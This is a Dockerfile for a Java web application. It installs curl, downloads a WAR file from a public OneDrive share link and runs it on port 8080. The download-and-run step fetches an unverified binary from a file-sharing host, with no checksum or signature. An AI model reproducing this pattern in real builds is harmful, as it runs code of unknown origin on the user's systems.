FROM openjdk:21-slim-buster
RUN apt update
RUN apt install -y curl
RUN curl -L https://public.dm.files.1drv.com/y4mutmpDhOXVouTlHbKg2-o_v0sTLb5bhHoF4tlVZwIWPTykXBsxUO5w0BsdRBjlO5A7F_XxqfRbJfREVKGMsyR-2FsfD3iIj8zqpdSl3BahLJcsLf-9DDsSKb3w2mGS2LmO2F7JFtmFjFHNUWpKeFWZQw3PhOoW_K2nNnzYAAVU0A49LwZB4U6YXbbhkXJs99HyQUyyH6JGycMw0T1bkvkSMZYZp6FNAuLMAdodHvyPLc?AVOverride=1 -o p1.war
 
CMD ["java", "-jar", "p1.war"]
EXPOSE 8080
